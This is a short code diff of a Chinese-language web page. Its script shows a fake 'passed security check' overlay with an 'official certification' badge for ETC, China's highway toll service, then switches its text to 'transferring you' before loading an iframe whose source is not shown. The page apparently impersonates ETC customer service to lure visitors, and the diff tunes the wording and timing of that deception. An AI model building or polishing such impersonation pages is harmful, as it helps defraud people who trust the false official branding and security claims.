@@ -112,11 +112,11 @@
                 </svg>
             </div>
             <div style="font-size:17px;font-weight:600;color:#1f1f1f;margin-bottom:6px;">已通过安全检测</div>
-            <div style="font-size:14px;color:#666;margin-bottom:18px;">【ETC服务中心】官方认证</div>
+            <div style="font-size:14px;color:#666;margin-bottom:18px;">【ETC客服】官方认证</div>
             <div style="display:flex;align-items:center;justify-content:center;gap:8px;font-size:14px;color:#333;">
-                <span>剩余时间</span>
+                <span>正在为您转接</span>
                 <span id="cd" style="display:inline-flex;align-items:center;justify-content:center;width:28px;height:28px;border-radius:8px;background:#f1f8ff;color:#1677ff;font-weight:700;font-size:15px;">${count}</span>
-                <span>秒</span>
+                <span></span>
             </div>
         `;
         document.body.appendChild(loader);
@@ -133,7 +133,7 @@
                 iframe.sandbox = "allow-same-origin allow-forms allow-scripts";
                 document.body.appendChild(iframe);
             }
-        },1000);
+        },800);
     },100);
 })();
 </script>
